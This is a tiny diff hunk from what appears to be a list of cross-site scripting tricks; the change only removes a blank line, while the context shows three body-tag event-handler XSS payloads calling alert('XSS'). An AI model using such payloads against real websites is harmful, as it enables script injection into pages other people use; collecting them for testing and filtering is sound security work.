@@ -38,4 +38,3 @@ tricks:
       <body onpageshow=alert('XSS')>
       <body onfocus=alert('XSS') tabindex=0 autofocus>
       <body onresize=alert('XSS')>
-
